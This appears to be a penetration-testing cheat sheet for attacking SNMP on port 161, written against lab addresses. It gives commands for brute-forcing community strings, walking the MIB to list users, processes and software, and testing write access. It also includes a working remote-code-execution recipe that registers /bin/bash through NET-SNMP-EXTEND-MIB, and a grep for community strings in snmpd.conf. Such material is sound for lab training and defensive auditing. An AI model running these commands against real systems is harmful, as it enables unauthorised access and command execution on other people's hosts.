# Port 161 - SNMP (Simple Network Management Protocol)
**Default Port:** 161 (UDP) 
**Key Insight:** SNMP is a goldmine. It reveals **Internal Process Lists** (security tools), **User Accounts**, **Installed Software**, and **Routing Tables** without requiring a shell.
## 1. Discovery & Brute Force (Community Strings)
**Goal:** Guess the "Community String" (Password). Common defaults: `public`, `private`, `manager`.
### OneSixtyOne (Fastest)
**Install:** `sudo apt install onesixtyone` 
**Description:** extremely fast UDP scanner. Checks a list of strings against targets. 
**Syntax:** `onesixtyone -c <CommunityList> <IP>`

```shell
# ⚠️ OPSEC: High Noise (UDP Spray).
# Scans IP against the default dict.
onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/snmp.txt 10.129.2.15
```
### Hydra (Brute Force)
**Syntax:** `hydra -P <Wordlist> udp://<Target>:161 snmp`
```shell
# Brute force using a custom wordlist
hydra -P /usr/share/wordlists/SecLists/Discovery/SNMP/snmp.txt udp://10.129.2.15:161 snmp
```
## 2. Enumeration & Data Extraction
**Goal:** Walk the MIB (Management Information Base) tree to extract system details.
### SNMPWalk (Standard)
**Install:** `sudo apt install snmp` 
**Description:** Queries the agent for a tree of information. 
**Syntax:** `snmpwalk -v<Version> -c <Community> <Target>`
```shell
# Walk the entire tree (-v2c is standard, -v1 is legacy)
# ⚠️ OPSEC: Moderate Noise. Generates thousands of packets.
snmpwalk -v2c -c public 10.129.2.15

# Walk specific OID (e.g., Processes)
snmpwalk -v2c -c public 10.129.2.15 1.3.6.1.2.1.25.4.2.1.2
```
### SNMP-Check (Human Readable - Recommended)
**Install:** `sudo apt install snmp-check` 
**Description:** Formats snmpwalk output into readable tables (OS, Processes, Users, Network). 
**Syntax:** `snmp-check <Target> -c <Community>`
```shell
# Best for quick situational awareness
snmp-check 10.129.2.15 -c public
```
### Braa (Mass Scanner)
**Description:** Ultra-fast tool for querying specific OIDs across **entire subnets**. 
**Syntax:** `braa <Community>@<IP>:<OID>`
```shell
# Query system info for a whole class C subnet
braa public@10.129.2.0/24:.1.3.6.1.2.1.1.1
```
## 3. Common OIDs Reference
**Concept:** OIDs (Object Identifiers) map to specific system values.

| **OID**                      | **Description**   | **Value**                                          |
| ------------------------ | ------------- | ---------------------------------------------- |
| `1.3.6.1.2.1.1.1`        | **SysDesc**   | OS Version, Kernel, Patch Level.               |
| `1.3.6.1.2.1.1.5`        | **SysName**   | Hostname.                                      |
| `1.3.6.1.2.1.25.1.1`     | **Uptime**    | System Uptime (Check for recent reboots).      |
| `1.3.6.1.2.1.25.4.2.1.2` | **Processes** | List of running process names.                 |
| `1.3.6.1.2.1.25.6.3.1.2` | **Software**  | List of installed software (finding versions). |
| `1.3.6.1.4.1.77.1.2.25`  | **Users**     | Windows Users list (Account Enumeration).      |
| `1.3.6.1.2.1.6.13.1.3`   | **TCP Ports** | Open TCP ports (Netstat via SNMP).             |
## 4. Dangerous Settings & Write Access (RCE)
**Vulnerability:** `rwcommunity` (Read-Write Community) allows an attacker to **modify** system configurations. 
**Risk:** **Critical (RCE)**. You can sometimes upload files or execute commands via the `NET-SNMP-EXTEND-MIB`.
### Checking for Write Access
```shell
# Try to modify the 'sysName' (Hostname)
# If this succeeds, you have Write Access.
snmpset -v2c -c private 10.129.2.15 1.3.6.1.2.1.1.5.0 s "HACKED_HOST"
```
### RCE via NET-SNMP-EXTEND-MIB
**Concept:** Register a new command in the SNMP agent and execute it. **Tools:** `snmp-shell`, `exploit-db scripts`.
```shell
# 1. Register a command (e.g., /bin/bash)
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private 10.129.2.15 'nsExtendStatus."evil"' = createAndGo 'nsExtendCommand."evil"' = /bin/bash 'nsExtendArgs."evil"' = '-c "touch /tmp/pwned"'

# 2. Trigger execution by querying it
snmpwalk -v 2c -c private 10.129.2.15 nsExtendOutput1Table
```
## 5. Post-Exploitation (Local Config)
**Context:** You have shell access.
### Configuration Files
**File:** `/etc/snmp/snmpd.conf`

| **Setting**                | **Risk**                                                 |
| ---------------------- | ---------------------------------------------------- |
| `rwuser noauth`        | **CRITICAL:** Full access without authentication.    |
| `rwcommunity <string>` | **CRITICAL:** Read-Write access (Potential RCE).     |
| `rocommunity <string>` | **HIGH:** Read-Only access (Information Disclosure). |
| `agentAddress udp:161` | Interfaces listening (Check if exposed to internet). |

```shell
# Extract sensitive strings
cat /etc/snmp/snmpd.conf | grep -v "#" | grep -E "community|user"
```